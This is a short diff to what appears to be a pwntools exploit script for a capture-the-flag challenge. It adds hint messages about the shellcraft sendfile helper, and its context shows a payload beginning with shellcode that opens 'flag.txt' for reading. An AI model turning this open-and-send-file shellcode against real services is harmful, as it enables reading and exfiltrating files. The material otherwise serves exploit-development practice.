@@ -39,7 +39,8 @@ def main():
     #   0xf     (15)	rt_sigreturn
 
     # Check https://filippo.io/linux-syscall-table/ about the conventioin for these syscalls.
-
+    info('To check if pwntools shellcraft contains sendfile, try `pwn shellcraft -l amd64.linux`')
+    info('To check the function arguments, try `help(shellcraft.sendfile)`')
     r.sendlineafter(b'do?', b'9')
     payload = flat(
             asm(shellcraft.openat('AT_FDCWD','flag.txt','O_RDONLY')),
